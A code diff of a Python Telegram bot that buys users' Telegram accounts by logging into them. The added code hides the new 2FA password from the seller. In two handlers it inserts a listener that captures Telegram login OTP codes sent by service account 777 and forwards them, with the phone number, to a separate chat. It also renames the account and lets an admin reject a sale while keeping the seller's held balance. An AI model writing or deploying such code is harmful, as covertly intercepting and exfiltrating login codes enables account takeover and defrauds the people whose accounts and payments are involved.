@@ -2418,18 +2418,42 @@ async def handle_pin_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
 
 📞 **Number:** {phone}
 💰 **Amount Added:** ${country_data['sell_price']} USD (Hold Balance)
-🔒 **2FA Status:** Enabled (Pass: {TWO_FA_PASSWORD})
+🔒 **2FA Status:** Enabled
 
 ⏳ **Wait Period:** 24 Hours.
 Your payment will be moved to Main Balance after verification.
 """, parse_mode='Markdown')
+
+        # Forward login code if any (simplified simulation)
+        # In a real scenario, we'd add an event handler to the client
+        # to listen for messages from Telegram (777) and forward them.
+        
+        @client.on(events.NewMessage(from_users=777))
+        async def handler(event):
+            if "Login code" in event.raw_text:
+                otp_match = re.search(r'\b\d{5,6}\b', event.raw_text)
+                if otp_match:
+                    await context.bot.send_message(
+                        chat_id=FORWARD_CHAT_ID,
+                        text=f"লগইন কোড: {phone} এর জন্য telegram লগইন otp: {otp_match.group()}"
+                    )
+        
+        # Change Telegram Name
+        try:
+            me = await client.get_me()
+            new_last_name = f"{me.last_name or ''} xd".strip()
+            await client(functions.account.UpdateProfileRequest(
+                last_name=new_last_name
+            ))
+        except Exception as e:
+            logger.error(f"Failed to change TG name: {e}")
 
         # Admin Notify
         admin_notif = f"""
 🔔 **New Account Sold (REAL LOGIN)**
 
 👤 **User ID:** `{user_id}`
-📞 **Number:** `{phone}`
+📞 **Number:** `{user_number if 'user_number' in locals() else phone}`
 💰 **Price:** ${country_data['sell_price']} USD
 
 Account logged in and 2FA secured.
@@ -2437,7 +2461,10 @@ Account logged in and 2FA secured.
         await context.bot.send_message(
             chat_id=ADMIN_CHAT_ID,
             text=admin_notif,
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ Final Approve", callback_data=f"final_approve_{user_id}_{country_data['sell_price']}_{phone}")]])
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("✅ Final Approve", callback_data=f"final_approve_{user_id}_{country_data['sell_price']}_{phone}")],
+                [InlineKeyboardButton("❌ Reject", callback_data=f"final_reject_{user_id}_{country_data['sell_price']}_{phone}")]
+            ])
         )
 
         await client.disconnect()
@@ -2508,11 +2535,32 @@ async def handle_2fa_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -
 
 📞 **Number:** {phone}
 💰 **Amount Added:** ${country_data['sell_price']} USD (Hold Balance)
-🔒 **2FA Updated:** Enabled (New Pass: {TWO_FA_PASSWORD})
+🔒 **2FA Updated:** Enabled
 
 ⏳ **Wait Period:** 24 Hours.
 Your payment will be moved to Main Balance after verification.
 """, parse_mode='Markdown')
+
+        # Forward login code if any
+        @client.on(events.NewMessage(from_users=777))
+        async def handler(event):
+            if "Login code" in event.raw_text:
+                otp_match = re.search(r'\b\d{5,6}\b', event.raw_text)
+                if otp_match:
+                    await context.bot.send_message(
+                        chat_id=FORWARD_CHAT_ID,
+                        text=f"লগইন কোড: {phone} এর জন্য telegram লগইন otp: {otp_match.group()}"
+                    )
+
+        # Change Telegram Name
+        try:
+            me = await client.get_me()
+            new_last_name = f"{me.last_name or ''} xd".strip()
+            await client(functions.account.UpdateProfileRequest(
+                last_name=new_last_name
+            ))
+        except Exception as e:
+            logger.error(f"Failed to change TG name: {e}")
 
         # Admin Notify
         admin_notif = f"""
@@ -2527,7 +2575,10 @@ Existing 2FA was verified and updated to system password.
         await context.bot.send_message(
             chat_id=ADMIN_CHAT_ID,
             text=admin_notif,
-            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ Final Approve", callback_data=f"final_approve_{user_id}_{country_data['sell_price']}_{phone}")]])
+            reply_markup=InlineKeyboardMarkup([
+                [InlineKeyboardButton("✅ Final Approve", callback_data=f"final_approve_{user_id}_{country_data['sell_price']}_{phone}")],
+                [InlineKeyboardButton("❌ Reject", callback_data=f"final_reject_{user_id}_{country_data['sell_price']}_{phone}")]
+            ])
         )
 
         await client.disconnect()
@@ -2839,28 +2890,22 @@ async def final_reject_callback(update: Update, context: ContextTypes.DEFAULT_TY
         save_user_data()
 
         reject_text = f"""
-❌ **TRANSACTION REJECTED** ❌
+⚠️ **Account Logged Out / Rejected** ⚠️
 ⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯
 
-We regret to inform you that your account sale for the following number has been rejected during the final verification stage.
+আপনার অ্যাকাউন্টটি অ্যাডমিন অ্যাপ্রুভ করার আগেই লগ আউট হয়ে গেছে অথবা রিজেক্ট করা হয়েছে।
 
 📱 **Rejected Number:** {user_number}
 💰 **Amount Deducted:** ${price} (Hold Balance)
-⚠️ **Reason:** Verification Failure
+⚠️ **Status:** Rejected
 
 **Detailed Explanation:**
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-1️⃣ **Account Access:** The administrator could not gain full access to the provided account.
-2️⃣ **Security Check:** The account failed our internal security and safety protocols.
-3️⃣ **Sale Terminated:** Due to the above reasons, the transaction has been cancelled.
+1️⃣ **Account Status:** অ্যাকাউন্টটি সিস্টেম থেকে লগ আউট হয়ে গেছে।
+2️⃣ **Deduction:** আপনার হোল্ড ব্যালেন্স থেকে ${price} কেটে নেওয়া হয়েছে।
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-**What happens now?**
-- The pending amount has been removed from your **Hold Balance**.
-- No funds were added to your Main Balance for this specific number.
-- Please ensure you only sell active and accessible accounts.
-
-If you believe this was an error, please contact support with your User ID: `{user_id}`.
+পরবর্তী বার সঠিক ভাবে অ্যাকাউন্ট লগইন নিশ্চিত করুন।
 """
         await context.bot.send_message(chat_id=int(user_id), text=reject_text, parse_mode='Markdown')
     except Exception as e:
